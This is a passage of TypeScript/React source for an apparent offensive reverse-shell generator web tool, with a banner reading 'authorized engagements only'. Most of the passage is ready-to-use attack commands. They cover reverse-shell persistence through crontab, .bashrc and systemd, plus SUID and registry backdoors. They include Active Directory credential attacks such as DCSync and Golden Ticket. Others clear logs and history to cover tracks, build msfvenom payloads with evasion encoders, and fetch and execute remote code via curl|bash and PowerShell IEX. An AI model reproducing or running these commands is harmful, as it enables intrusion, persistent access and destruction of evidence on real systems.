        cmd: `echo "* * * * * root bash -i >& /dev/tcp/LHOST/LPORT 0>&1" >> /etc/crontab`,
      },
      {
        label: "SSH authorized_keys",
        cmd: `echo "SSH_PUBKEY" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`,
      },
      {
        label: "SUID backdoor",
        cmd: "cp /bin/bash /tmp/.suid_backdoor && chmod +s /tmp/.suid_backdoor",
      },
      {
        label: ".bashrc backdoor",
        cmd: `echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> ~/.bashrc`,
      },
      {
        label: "Systemd service",
        cmd: `echo '[Unit]\n[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/sysupdate.service && systemctl enable sysupdate --now`,
      },
      {
        label: "LD_PRELOAD hook",
        cmd: "# Create shared library with __attribute__((constructor)) function calling reverse shell, add path to /etc/ld.so.preload",
      },
    ],
  },
  {
    id: "persistence-win",
    label: "Windows Persistence",
    icon: "🔒",
    commands: [
      {
        label: "Registry Run key",
        cmd: `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Temp\\shell.exe" /f`,
      },
      {
        label: "Scheduled task",
        cmd: `schtasks /create /sc onlogon /tn "WinUpdate" /tr "C:\\Temp\\shell.exe" /ru SYSTEM`,
      },
      {
        label: "Startup folder",
        cmd: `copy shell.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"`,
      },
      {
        label: "Service persistence",
        cmd: `sc create "WinHelper" binPath= "C:\\Temp\\shell.exe" start= auto && net start WinHelper`,
      },
      {
        label: "WMI event subscription",
        cmd: `# Persistent WMI — triggers on events. Use PowerSploit's Install-Persistence -WMI`,
      },
      {
        label: "DLL hijacking",
        cmd: "# Drop malicious DLL in app dir where legit app loads DLL without full path (use Procmon to find candidates)",
      },
      {
        label: "IFEO debugger key",
        cmd: `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\windows\\system32\\cmd.exe"`,
      },
    ],
  },
  {
    id: "active-directory",
    label: "Active Directory",
    icon: "🏢",
    commands: [
      {
        label: "Bloodhound collection",
        cmd: "bloodhound-python -u user -p password -d domain.local -c All --zip",
      },
      {
        label: "BloodHound (SharpHound)",
        cmd: `.\SharpHound.exe -c All --zipfilename bloodhound_data.zip`,
      },
      {
        label: "Kerberoast",
        cmd: "impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.hashes",
      },
      {
        label: "AS-REP Roast",
        cmd: "impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -request -outputfile asrep.hashes",
      },
      {
        label: "Crackmapexec (enum users)",
        cmd: "crackmapexec smb DC_IP --users -u '' -p ''",
      },
      {
        label: "Kerbrute user enum",
        cmd: "kerbrute userenum --dc DC_IP -d domain.local users.txt",
      },
      {
        label: "Pass-the-Ticket",
        cmd: "impacket-ticketer -nthash HASH -domain-sid SID -domain domain.local -spn service/host username",
      },
      {
        label: "Golden Ticket (mimikatz)",
        cmd: `kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt`,
      },
      {
        label: "DCSync attack",
        cmd: "impacket-secretsdump -just-dc-ntlm domain.local/user:password@DC_IP",
      },
      {
        label: "NTLM relay (responder)",
        cmd: "responder -I eth0 -rdwv  # then: impacket-ntlmrelayx -tf targets.txt -smb2support",
      },
    ],
  },
  {
    id: "cleanup",
    label: "Cleanup & Cover Tracks",
    icon: "🧹",
    commands: [
      {
        label: "Clear bash history",
        cmd: "history -c; echo '' > ~/.bash_history; unset HISTFILE",
      },
      {
        label: "Clear auth logs (Linux)",
        cmd: "echo '' > /var/log/auth.log; echo '' > /var/log/secure",
      },
      {
        label: "Clear syslog",
        cmd: "echo '' > /var/log/syslog; echo '' > /var/log/messages",
      },
      {
        label: "Remove tmp artifacts",
        cmd: "rm -rf /tmp/f /tmp/s /tmp/.suid_backdoor /tmp/t.go /tmp/*.sh",
      },
      {
        label: "Windows event log clear",
        cmd: `wevtutil cl System; wevtutil cl Security; wevtutil cl Application`,
      },
      {
        label: "Timestomp (Linux)",
        cmd: "touch -t 202001010000 /path/to/file  # set atime/mtime to Jan 1 2020",
      },
      { label: "Delete prefetch", cmd: `del /q /f C:\\Windows\\Prefetch\\*` },
      {
        label: "Clear PS history (Win)",
        cmd: `Remove-Item (Get-PSReadLineOption).HistorySavePath -Force`,
      },
      {
        label: "Remove run key",
        cmd: `reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /f`,
      },
      {
        label: "Remove scheduled task",
        cmd: `schtasks /delete /tn "WinUpdate" /f`,
      },
    ],
  },
];

const THEMES: Record<ThemeKey, Theme> = {
  green: {
    name: "Green",
    accent: "#00ff41",
    dim: "#00aa28",
    bg: "#0a0f0a",
    panel: "#0d140d",
    border: "#1a2e1a",
    text: "#c8ffc8",
    muted: "#4a7a4a",
  },
  amber: {
    name: "Amber",
    accent: "#ffb300",
    dim: "#cc8800",
    bg: "#0f0e0a",
    panel: "#14120d",
    border: "#2e2a1a",
    text: "#fff3c8",
    muted: "#7a6a4a",
  },
  red: {
    name: "Red",
    accent: "#ff3131",
    dim: "#cc0000",
    bg: "#0f0a0a",
    panel: "#140d0d",
    border: "#2e1a1a",
    text: "#ffc8c8",
    muted: "#7a4a4a",
  },
  cyan: {
    name: "Cyan",
    accent: "#00eeff",
    dim: "#00aabb",
    bg: "#0a0f0f",
    panel: "#0d1414",
    border: "#1a2e2e",
    text: "#c8ffff",
    muted: "#4a7a7a",
  },
};

const TTY_STEPS = [
  {
    id: "spawn",
    title: "1. Spawn PTY",
    description: "Run one of these on the target:",
    commands: [
      {
        label: "Python3 (preferred)",
        cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        preferred: true,
      },
      { label: "Script", cmd: "script /dev/null -c bash" },
      {
        label: "Python2",
        cmd: "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
      },
      { label: "Perl", cmd: "perl -e 'exec \"/bin/bash\";'" },
    ],
  },
  {
    id: "background",
    title: "2. Background the shell",
    description: "Press Ctrl+Z to background the remote shell.",
    commands: [{ label: "Background", cmd: "^Z  (Ctrl+Z)", preferred: true }],
  },
  {
    id: "local",
    title: "3. Fix local terminal",
    description: "Configure your local terminal for raw input:",
    commands: [
      { label: "Raw + echo off", cmd: "stty raw -echo; fg", preferred: true },
    ],
  },
  {
    id: "term",
    title: "4. Set terminal vars",
    description:
      "After pressing Enter twice, fix terminal variables on the target:",
    commands: [
      { label: "TERM", cmd: "export TERM=xterm-256color", preferred: true },
      {
        label: "Rows/cols (check local first: stty size)",
        cmd: "stty rows 50 cols 220",
      },
      { label: "Reset shell", cmd: "export SHELL=bash; reset" },
    ],
  },
];

const NOISE_CONFIG = {
  low: {
    color: "#00ff41",
    label: "LOW NOISE",
    desc: "Quieter — less likely to trigger alerts",
  },
  medium: {
    color: "#ffb300",
    label: "MEDIUM",
    desc: "Moderate detection risk",
  },
  high: {
    color: "#ff3131",
    label: "HIGH NOISE",
    desc: "Easily detected by EDR/SIEM",
  },
};

const PLATFORM_ICONS: Record<string, string> = {
  "Windows EXE": "🪟",
  "Windows DLL": "🔷",
  "Windows Script": "📜",
  Shellcode: "⚙",
  "Linux ELF": "🐧",
  macOS: "🍎",
  "Android APK": "🤖",
  iOS: "📱",
  "Web Payload": "🌐",
  Evasion: "🛡",
  "Network / SCADA": "🔌",
  BSD: "😈",
};

const CATEGORY_ICONS: Record<string, string> = {
  Bash: "bash",
  Python: "py",
  PHP: "php",
  Netcat: "nc",
  PowerShell: "PS>",
  Ruby: "rb",
  Perl: "pl",
  Java: "jv",
  Go: "go",
  "Node.js": "js",
  Socat: "sc",
  Awk: "awk",
  Lua: "lua",
  OpenSSL: "ssl",
  Telnet: "tel",
  Download: "dl",
  JVM: "jvm",
  R: "R",
  Zsh: "zsh",
  Kotlin: "kt",
  Windows: "cmd",
  Haskell: "hs",
  Tcl: "tcl",
};

function encodePayload(payload: string, method: EncodingKey): string {
  switch (method) {
    case "base64":
      return btoa(payload);
    case "url":
      return encodeURIComponent(payload);
    case "double-url":
      return encodeURIComponent(encodeURIComponent(payload));
    case "hex":
      return Array.from(payload)
        .map((c) => c.charCodeAt(0).toString(16).padStart(2, "0"))
        .join("");
    case "powershell-b64":
      try {
        return `powershell -EncodedCommand ${btoa(unescape(encodeURIComponent(payload)))}`;
      } catch {
        return btoa(payload);
      }
    default:
      return payload;
  }
}

function getListener(port: string, type: ListenerType, ip?: string): string {
  switch (type) {
    case "nc":
      return `nc -lvnp ${port}`;
    case "ncat":
      return `ncat -lvp ${port}`;
    case "socat":
      return `socat -d -d TCP-LISTEN:${port},reuseaddr,fork STDOUT`;
    case "socat-pty":
      return `socat -d -d TCP-LISTEN:${port},reuseaddr FILE:\`tty\`,raw,echo=0`;
    case "socat-tls":
      return `# Generate cert:\nopenssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt\n# Listen:\nsocat OPENSSL-LISTEN:${port},cert=server.crt,key=server.key,verify=0 FILE:\`tty\`,raw,echo=0`;
    case "pwncat":
      return `pwncat-cs -lp ${port}`;
    case "msf-multi":
      return `use exploit/multi/handler\nset payload generic/shell_reverse_tcp\nset LHOST ${ip || "LHOST"}\nset LPORT ${port}\nrun`;
    default:
      return `nc -lvnp ${port}`;
  }
}

function highlightPayload(payload: string, accent: string): string {
  const ips = payload.replace(
    /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g,
    `<span style="color:${accent};font-weight:bold">$1</span>`,
  );
  return ips.replace(/\b(\d{2,5})\b/g, (m, n) => {
    if (parseInt(n) >= 1 && parseInt(n) <= 65535)
      return `<span style="color:#ff9f43;font-weight:bold">${n}</span>`;
    return m;
  });
}

function hexToRgb(hex: string): string {
  const c = hex.replace("#", "");
  return `${parseInt(c.substring(0, 2), 16)},${parseInt(c.substring(2, 4), 16)},${parseInt(c.substring(4, 6), 16)}`;
}

function downloadText(content: string, filename: string): void {
  const blob = new Blob([content], { type: "text/plain" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  a.click();
  URL.revokeObjectURL(a.href);
}

export default function DrewsRevShell(): React.ReactElement {
  const [ip, setIp] = useState<string>("10.10.10.10");
  const [port, setPort] = useState<string>("4444");
  const [selectedShell, setSelectedShell] = useState<Shell>(SHELLS[0]);
  const [encoding, setEncoding] = useState<EncodingKey>("none");
  const [theme, setTheme] = useState<ThemeKey>("green");
  const [copied, setCopied] = useState<boolean>(false);
  const [copiedListener, setCopiedListener] = useState<boolean>(false);
  const [copiedCmd, setCopiedCmd] = useState<string>("");
  const [showExplain, setShowExplain] = useState<boolean>(false);
  const [showOpsec, setShowOpsec] = useState<boolean>(true);
  const [listenerType, setListenerType] = useState<ListenerType>("nc");
  const [search, setSearch] = useState<string>("");
  const [favorites, setFavorites] = useState<Set<string>>(
    new Set(["bash-tcp", "python3", "nc-openbsd", "ps-b64"]),
  );
  const [history, setHistory] = useState<HistoryEntry[]>([]);
  const [activeTab, setActiveTab] = useState<TabKey>("payload");
  const [autoIpLoading, setAutoIpLoading] = useState<boolean>(false);
  const [ttyStep, setTtyStep] = useState<number>(0);
  const [msfCategory, setMsfCategory] = useState<string>("Windows EXE");
  const [selectedMsf, setSelectedMsf] = useState<MsfPayload>(MSF_PAYLOADS[0]);
  const [copiedMsf, setCopiedMsf] = useState<string>("");
  const [msfIterations, setMsfIterations] = useState<string>("5");
  const [msfEncoder, setMsfEncoder] = useState<string>("x86/shikata_ga_nai");
  const [showMsfListener, setShowMsfListener] = useState<boolean>(false);
  const [msfSearch, setMsfSearch] = useState<string>("");
  const [postexSection, setPostexSection] = useState<string>("enum-linux");
  const [copiedPostex, setCopiedPostex] = useState<string>("");
  const [postexFilter, setPostexFilter] = useState<string>("");
  const [engagement, setEngagement] = useState<Engagement>({
    name: "",
    target: "",
    operator: "",
    id: "",
    scope: "",
    notes: "",
  });
  const [webPort, setWebPort] = useState<string>("8080");
  const [copiedWeb, setCopiedWeb] = useState<string>("");
  const [badChars, setBadChars] = useState<string>("\\x00");
  const [useBadChars, setUseBadChars] = useState<boolean>(false);
  const notesRef = useRef<HTMLTextAreaElement>(null);

  const t: Theme = THEMES[theme];
  const payload: string = selectedShell.generate(ip || "IP", port || "PORT");
  const encodedPayload: string = encodePayload(payload, encoding);
  const listenerCmd: string = getListener(port || "PORT", listenerType, ip);

  const ipError = useMemo(() => {
    if (!ip) return "";
    const v4 = /^(\d{1,3}\.){3}\d{1,3}$/;
    const v6 = /^[0-9a-fA-F:]+$/;
    const hn = /^[a-zA-Z0-9.-]+$/;
    if (!v4.test(ip) && !v6.test(ip) && !hn.test(ip))
      return "Invalid IP/hostname";
    return "";
  }, [ip]);
  const portError = useMemo(() => {
    if (!port) return "";
    const n = parseInt(port, 10);
    if (isNaN(n) || n < 1 || n > 65535) return "Port: 1–65535";
    return "";
  }, [port]);

  const buildMsfCmd = useCallback(
    (msf: MsfPayload, lhost: string, lport: string): string => {
      const base = `msfvenom -p ${msf.payload} LHOST=${lhost || "LHOST"} LPORT=${lport || "LPORT"}`;
      let extra = "";
      if (msf.id === "win-x64-encoded")
        extra = ` -e ${msfEncoder} -i ${msfIterations}`;
      else if (msf.id === "win-x64-xor-encoded")
        extra = ` -e x64/xor_dynamic -i 3`;
      else if (msf.id === "win-x64-no-null" || useBadChars)
        extra = ` -b '${badChars}'`;
      const fmt = msf.format !== "raw" ? ` -f ${msf.format}` : " -f raw";
      return `${base}${extra}${fmt} -o ${msf.output}`;
    },
    [msfEncoder, msfIterations, badChars, useBadChars],
  );

  const buildMsfListener = useCallback(
    (msf: MsfPayload, lhost: string, lport: string): string => {
      if (!msf.listener) return `nc -lvnp ${lport}`;
      return msf.listener
        .replace(/LHOST/g, lhost || "LHOST")
        .replace(/LPORT/g, lport || "LPORT");
    },
    [],
  );

  useEffect(() => {
    if (!ip || !port || ipError || portError) return;
    const entry: HistoryEntry = {
      payload: encodedPayload,
      shell: selectedShell.label,
      ts: Date.now(),
      ip,
      port,
    };
    const id = setTimeout(() => {
      setHistory((h) => {
        const f = h.filter((x) => x.payload !== entry.payload);
        return [entry, ...f].slice(0, 20);
      });
    }, 0);
    return () => clearTimeout(id);
  }, [encodedPayload]);

  const copyText = useCallback(
    (text: string, setter: (v: string) => void, key: string, ms = 1500) => {
      navigator.clipboard.writeText(text).then(() => {
        setter(key);
        setTimeout(() => setter(""), ms);
      });
    },
    [],
  );

  const copyPayload = useCallback(() => {
    navigator.clipboard.writeText(encodedPayload).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    });
  }, [encodedPayload]);
  const copyListener = useCallback(() => {
    navigator.clipboard.writeText(listenerCmd).then(() => {
      setCopiedListener(true);
      setTimeout(() => setCopiedListener(false), 1500);
    });
  }, [listenerCmd]);

  const fetchPublicIp = async () => {
    setAutoIpLoading(true);
    try {
      const r = await fetch("https://api.ipify.org?format=json");
      const d = await r.json();
      setIp(d.ip);
    } catch {
      setIp("fetch-failed");
    }
    setAutoIpLoading(false);
  };

  const toggleFavorite = (id: string) => {
    setFavorites((f) => {
      const n = new Set(f);
      n.has(id) ? n.delete(id) : n.add(id);
      return n;
    });
  };

  const downloadShellScript = () => {
    const header = engagement.name
      ? `#!/usr/bin/env bash\n# ══════════════════════════════════════════════════════\n# ENGAGEMENT: ${engagement.name}  |  ID: ${engagement.id || "N/A"}\n# TARGET:     ${engagement.target || "N/A"}  |  OPERATOR: ${engagement.operator || "N/A"}\n# SCOPE:      ${engagement.scope || "N/A"}\n# Generated:  ${new Date().toISOString()}\n# ══════════════════════════════════════════════════════\n`
      : `#!/usr/bin/env bash\n# Generated by Drew's RevShell — authorized engagements only\n# ${new Date().toISOString()}\n`;
    downloadText(
      `${header}\n# Shell: ${selectedShell.label}\n# LHOST: ${ip}  LPORT: ${port}\n# Encoding: ${encoding}\n# MITRE: ${selectedShell.mitre?.join(", ") || "N/A"}\n\n${encodedPayload}\n`,
      `revshell.${selectedShell.ext}`,
    );
  };

  const downloadMsfBundle = (
    msf: MsfPayload,
    cmd: string,
    listener: string,
  ) => {
    const header = engagement.name
      ? `# ══════════════════════════════════════════════════════\n# ENGAGEMENT: ${engagement.name}  |  ID: ${engagement.id || "N/A"}\n# TARGET:     ${engagement.target || "N/A"}  |  OPERATOR: ${engagement.operator || "N/A"}\n# Generated:  ${new Date().toISOString()}\n# ══════════════════════════════════════════════════════`
      : `# Generated by Drew's RevShell — authorized engagements only\n# ${new Date().toISOString()}`;
    const listenerFmt = listener
      .split("\n")
      .map((l, i) => (i === 0 ? l : `        ${l}`))
      .join("\n");
    const content = `#!/usr/bin/env bash\n${header}\n\n# ── Payload: ${msf.label}\n# ── Platform: ${msf.platform}/${msf.arch}  Format: .${msf.format}  Staged: ${msf.staged ? "YES" : "NO"}\n# ── MITRE: ${msf.mitre?.join(", ") || "N/A"}\n# ── Notes: ${msf.notes}\n\necho "[*] STEP 1 — Generate payload"\n${cmd}\necho "[+] Saved: ${msf.output}"\n\necho "[*] STEP 2 — Serve payload (run separately)"\necho "    python3 -m http.server ${webPort}"\necho "    Target fetch: curl http://${ip || "LHOST"}:${webPort}/${msf.output} -o /tmp/${msf.output}"\n\necho "[*] STEP 3 — Start listener"\n# ${listenerFmt}\n`;
    downloadText(content, `bundle_${msf.output.replace(/\./g, "_")}.sh`);
  };

  const downloadListenerScript = (msf: MsfPayload, listener: string) => {
    const isMsf = listener.includes("use exploit");
    const header = `#!/usr/bin/env bash\n# Listener: ${msf.label}\n# Generated: ${new Date().toISOString()}\n${engagement.name ? `# Engagement: ${engagement.name}\n` : ""}\n`;
    const body = isMsf
      ? `msfconsole -q -x "${listener.split("\n").join(";")}"`
      : `${listener}`;
    downloadText(`${header}${body}\n`, `listener_${msf.id}.sh`);
  };

  const downloadEngagementReport = () => {
    const ts = new Date().toISOString();
    const lines = [
      "╔══════════════════════════════════════════════════════════════╗",
      "║          DREW'S REVSHELL — ENGAGEMENT PAYLOAD REPORT        ║",
      "╚══════════════════════════════════════════════════════════════╝",
      "",
      `Engagement:  ${engagement.name || "N/A"}`,
      `Engagement ID: ${engagement.id || "N/A"}`,
      `Target:      ${engagement.target || "N/A"}`,
      `Operator:    ${engagement.operator || "N/A"}`,
      `Scope:       ${engagement.scope || "N/A"}`,
      `Generated:   ${ts}`,
      "",
      "═══ CONNECTION SETTINGS ════════════════════════════",
      `LHOST: ${ip || "N/A"}  LPORT: ${port || "N/A"}`,
      "",
      "═══ PAYLOAD HISTORY (last 20) ══════════════════════",
      ...history.map(
        (h, i) =>
          `[${i + 1}] ${h.shell} | ${h.ip}:${h.port} | ${new Date(h.ts).toLocaleTimeString()}\n    ${h.payload}`,
      ),
      "",
      "═══ ENGAGEMENT NOTES ═══════════════════════════════",
      engagement.notes || "(none)",
      "",
      "═══ GENERATED BY DREW'S REVSHELL ════════════════════",
      "FOR AUTHORIZED ENGAGEMENTS ONLY",
    ];
    downloadText(
      lines.join("\n"),
      `engagement_report_${ts.replace(/[:.]/g, "-")}.txt`,
    );
  };

  const categories = [...new Set(SHELLS.map((s) => s.category))];
  const filteredShells = SHELLS.filter(
    (s) =>
      s.label.toLowerCase().includes(search.toLowerCase()) ||
      s.category.toLowerCase().includes(search.toLowerCase()),
  );
  const favShells = SHELLS.filter((s) => favorites.has(s.id));

  const msfCategoryPayloads = useMemo(() => {
    const base = MSF_PAYLOADS.filter((p) => p.category === msfCategory);
    if (!msfSearch.trim()) return base;
    const q = msfSearch.toLowerCase();
    return base.filter(
      (p) =>
        p.label.toLowerCase().includes(q) ||
        p.payload.toLowerCase().includes(q) ||
        p.notes.toLowerCase().includes(q),
    );
  }, [msfCategory, msfSearch]);

  const activePostexSection = POSTEX_SECTIONS.find(
    (s) => s.id === postexSection,
  );
  const filteredPostexCmds =
    activePostexSection?.commands.filter(
      (c) =>
        !postexFilter ||
        c.label.toLowerCase().includes(postexFilter.toLowerCase()) ||
        c.cmd.toLowerCase().includes(postexFilter.toLowerCase()),
    ) || [];

  const encodingOptions: [EncodingKey, string][] = [
    ["none", "raw"],
    ["base64", "b64"],
    ["url", "url"],
    ["double-url", "2url"],
    ["hex", "hex"],
    ["powershell-b64", "ps-b64"],
  ];
  const noiseInfo = selectedShell.noise
    ? NOISE_CONFIG[selectedShell.noise]
    : null;

  // Web delivery cradles
  const webCradles = [
    {
      id: "bash-curl",
      label: "Bash — curl",
      cmd: `curl -fsSL http://${ip}:${webPort}/shell.sh | bash`,
    },
    {
      id: "bash-wget",
      label: "Bash — wget",
      cmd: `wget -qO- http://${ip}:${webPort}/shell.sh | bash`,
    },
    {
      id: "ps-iex",
      label: "PowerShell — IEX",
      cmd: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${ip}:${webPort}/shell.ps1')"`,
    },
    {
      id: "ps-iwr",
      label: "PowerShell — IWR",
      cmd: `powershell -nop -c "IWR http://${ip}:${webPort}/shell.ps1 -UseBasicParsing | IEX"`,
    },
    {
      id: "ps-b64-cradle",
      label: "PowerShell — B64 Cradle",
      cmd: `powershell -enc ${btoa(`IEX(New-Object Net.WebClient).DownloadString('http://${ip}:${webPort}/shell.ps1')`)}`,
    },
    {
      id: "certutil-dl",
      label: "Windows — certutil DL",
      cmd: `certutil -urlcache -split -f http://${ip}:${webPort}/shell.exe %TEMP%\\s.exe && %TEMP%\\s.exe`,
    },
    {
      id: "bitsadmin",
      label: "Windows — bitsadmin",
      cmd: `bitsadmin /transfer job /download /priority high http://${ip}:${webPort}/shell.exe C:\\Temp\\s.exe && C:\\Temp\\s.exe`,
    },
    {
      id: "regsvr32-scr",
      label: "Windows — regsvr32 (SCT)",
      cmd: `regsvr32 /s /n /u /i:http://${ip}:${webPort}/shell.sct scrobj.dll`,
    },
    {
      id: "mshta-url",
      label: "Windows — mshta URL",
      cmd: `mshta http://${ip}:${webPort}/shell.hta`,
    },
    {
      id: "python-urllib",
      label: "Python — urllib exec",
      cmd: `python3 -c "import urllib.request,os;exec(urllib.request.urlopen('http://${ip}:${webPort}/shell.py').read())"`,
    },
    {
      id: "ruby-open",
      label: "Ruby — open-uri exec",
      cmd: `ruby -e "require 'open-uri'; eval(URI.open('http://${ip}:${webPort}/shell.rb').read)"`,
    },
    {
      id: "php-system",
      label: "PHP — system exec",
      cmd: `php -r "system(file_get_contents('http://${ip}:${webPort}/shell.sh'));"`,
    },
    {
      id: "server-python",
      label: "▶ Start Python server",
      cmd: `python3 -m http.server ${webPort}`,
    },
    {
      id: "server-php",
      label: "▶ Start PHP server",
      cmd: `php -S 0.0.0.0:${webPort}`,
    },
    {
      id: "server-ruby",
      label: "▶ Start Ruby server",
      cmd: `ruby -run -e httpd . -p ${webPort}`,
    },
    {
      id: "server-socat",
      label: "▶ Socat one-file server",
      cmd: `socat TCP-LISTEN:${webPort},fork,reuseaddr OPEN:shell.sh`,
    },
  ];

  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key === "Enter") {
        e.preventDefault();
        copyPayload();
      }
      if ((e.ctrlKey || e.metaKey) && e.key === "k") {
        e.preventDefault();
        setSearch("");
      }
    };
    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, [copyPayload]);

  const css = `
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Share+Tech+Mono&display=swap');
    *{box-sizing:border-box;margin:0;padding:0;}
    :root{--accent:${t.accent};--dim:${t.dim};--bg:${t.bg};--panel:${t.panel};--border:${t.border};--text:${t.text};--muted:${t.muted};}
    body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;}
    ::-webkit-scrollbar{width:4px;height:4px;}::-webkit-scrollbar-track{background:var(--bg);}::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px;}
    @keyframes scanline{0%{transform:translateY(-100%);}100%{transform:translateY(100vh);}}
    @keyframes flicker{0%,100%{opacity:1;}92%{opacity:1;}93%{opacity:0.8;}94%{opacity:1;}96%{opacity:0.9;}}
    @keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
    @keyframes fadeIn{from{opacity:0;transform:translateY(4px);}to{opacity:1;transform:translateY(0);}}
    @keyframes pulse{0%,100%{box-shadow:0 0 5px var(--accent);}50%{box-shadow:0 0 20px var(--accent);}}
    @keyframes slideIn{from{opacity:0;transform:translateX(-8px);}to{opacity:1;transform:translateX(0);}}
    .scanline{position:fixed;top:0;left:0;right:0;height:2px;background:linear-gradient(transparent,rgba(${hexToRgb(t.accent)},0.08),transparent);animation:scanline 8s linear infinite;pointer-events:none;z-index:9999;}
    .crt{position:fixed;inset:0;pointer-events:none;z-index:9998;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.03) 0px,rgba(0,0,0,0.03) 1px,transparent 1px,transparent 2px);animation:flicker 6s infinite;}
    .app{display:flex;flex-direction:column;min-height:100vh;animation:fadeIn 0.4s ease;}
    .header{border-bottom:1px solid var(--border);padding:8px 16px;display:flex;align-items:center;justify-content:space-between;background:var(--panel);position:sticky;top:0;z-index:100;}
    .logo{display:flex;align-items:center;gap:10px;}
    .logo-icon{width:32px;height:32px;border:1px solid var(--accent);display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--accent);font-weight:700;box-shadow:0 0 10px var(--dim),inset 0 0 10px rgba(0,0,0,0.5);animation:pulse 3s ease-in-out infinite;}
    .logo-text{font-family:'Share Tech Mono',monospace;font-size:16px;color:var(--accent);letter-spacing:3px;text-shadow:0 0 15px var(--dim);}
    .logo-sub{font-size:9px;color:var(--muted);letter-spacing:2px;margin-top:1px;}
    .header-right{display:flex;gap:12px;align-items:center;flex-wrap:wrap;}
    .auth-banner{padding:3px 10px;border:1px solid var(--dim);font-size:9px;color:var(--dim);letter-spacing:1px;}
    .eng-badge{padding:3px 10px;border:1px solid var(--border);font-size:9px;color:var(--muted);cursor:pointer;transition:all 0.2s;}
    .eng-badge:hover{border-color:var(--accent);color:var(--accent);}
    .eng-badge.active{border-color:var(--accent);color:var(--accent);}
    .theme-btns{display:flex;gap:5px;}
    .theme-btn{width:14px;height:14px;border-radius:50%;cursor:pointer;border:2px solid transparent;transition:all 0.2s;}
    .theme-btn.active{border-color:#ffffff88;transform:scale(1.2);}
    .main{display:flex;flex:1;gap:0;}
    .sidebar{width:200px;min-width:200px;border-right:1px solid var(--border);background:var(--panel);display:flex;flex-direction:column;height:calc(100vh - 49px);position:sticky;top:49px;overflow:hidden;}
    .sidebar-search{padding:7px 10px;border-bottom:1px solid var(--border);}
    .search-input{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 10px;font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;transition:border 0.2s;}
    .search-input:focus{border-color:var(--accent);}
    .shell-list{overflow-y:auto;flex:1;}
    .shell-category{padding:7px 10px 3px;font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;}
    .shell-item{display:flex;align-items:center;gap:7px;padding:5px 10px;cursor:pointer;transition:all 0.15s;border-left:2px solid transparent;font-size:11px;}
    .shell-item:hover{background:rgba(255,255,255,0.03);border-left-color:var(--dim);}
    .shell-item.active{background:rgba(255,255,255,0.06);border-left-color:var(--accent);color:var(--accent);animation:slideIn 0.15s ease;}
    .shell-icon{width:24px;height:16px;background:var(--bg);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:7px;color:var(--muted);flex-shrink:0;font-weight:700;}
    .shell-item.active .shell-icon{border-color:var(--accent);color:var(--accent);}
    .shell-noise{width:5px;height:5px;border-radius:50%;flex-shrink:0;}
    .star-btn{background:none;border:none;cursor:pointer;color:var(--muted);font-size:11px;padding:0 2px;flex-shrink:0;}
    .star-btn.active{color:#ffd700;}
    .content{flex:1;display:flex;flex-direction:column;overflow:hidden;}
    .config-bar{padding:10px 16px;border-bottom:1px solid var(--border);background:var(--panel);display:flex;flex-wrap:wrap;gap:10px;align-items:flex-end;}
    .field{display:flex;flex-direction:column;gap:3px;}
    .field-label{font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;}
    .field-input{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 10px;font-family:'JetBrains Mono',monospace;font-size:13px;outline:none;transition:all 0.2s;width:170px;}
    .field-input:focus{border-color:var(--accent);box-shadow:0 0 8px var(--dim);}
    .field-input.error{border-color:#ff4444;}
    .error-msg{font-size:9px;color:#ff4444;margin-top:2px;}
    .port-quick{display:flex;gap:3px;flex-wrap:wrap;margin-top:3px;}
    .port-chip{padding:2px 6px;background:var(--bg);border:1px solid var(--border);font-size:9px;cursor:pointer;color:var(--muted);transition:all 0.15s;font-family:'JetBrains Mono',monospace;}
    .port-chip:hover,.port-chip.active{border-color:var(--accent);color:var(--accent);}
    .ip-row{display:flex;gap:5px;align-items:flex-end;}
    .auto-btn{padding:5px 9px;background:var(--bg);border:1px solid var(--border);color:var(--muted);font-size:9px;cursor:pointer;transition:all 0.2s;font-family:'JetBrains Mono',monospace;white-space:nowrap;}
    .auto-btn:hover{border-color:var(--accent);color:var(--accent);}
    .tabs{display:flex;border-bottom:1px solid var(--border);background:var(--panel);overflow-x:auto;}
    .tab{padding:8px 14px;font-size:10px;cursor:pointer;color:var(--muted);border-bottom:2px solid transparent;transition:all 0.2s;letter-spacing:1px;white-space:nowrap;}
    .tab:hover{color:var(--text);}
    .tab.active{color:var(--accent);border-bottom-color:var(--accent);}
